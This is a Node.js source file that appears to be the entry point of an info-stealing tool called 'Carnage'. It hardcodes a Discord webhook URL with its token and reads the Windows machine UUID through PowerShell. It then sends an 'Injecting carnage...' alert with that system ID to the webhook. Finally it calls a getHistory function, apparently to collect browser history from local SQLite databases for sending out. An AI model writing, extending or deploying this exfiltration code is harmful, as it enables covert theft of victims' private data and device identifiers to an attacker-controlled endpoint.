const sqlite3 = require("sqlite3").verbose();
const fs = require("fs");
const { Webhook, MessageBuilder } = require("discord-webhook-node");
const { execSync } = require("child_process");

const { getHistory } = require("./functions/getHistory.js");
const { getSystem } = require("./functions/getSystem.js");


const hook = new Webhook(
  "https://discord.com/api/webhooks/1138462515454554135/hsEdSmkgsIjWvampcOsULlB0qyo5KonrdiTKxb8DlHF7hfOQC1V8-2L53cN0tLGphVgd"
);
global.hook = hook;

const IMAGE_URL = "https://avatarfiles.alphacoders.com/222/222224.jpg";
hook.setUsername("Carnage");
hook.setAvatar(IMAGE_URL);

let UUID = execSync(
  "powershell.exe (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID"
)
  .toString()
  .split("\r\n")[0];



  const embed = new MessageBuilder()
  .setDescription(`Started <t:${Math.floor(new Date()/1000)}:R>`)
  .setTitle(`Injecting carnage...`)
  .setURL('https://github.com/MaxMady/Carnage')
  .setColor('#592237')
  .setThumbnail('https://cdn.discordapp.com/attachments/1138462399880507424/1138470343107956797/image.png')
  .setFooter('System ID: '+UUID)
  .setTimestamp();
   
  hook.send(embed);

  getHistory()

  module.exports = hook;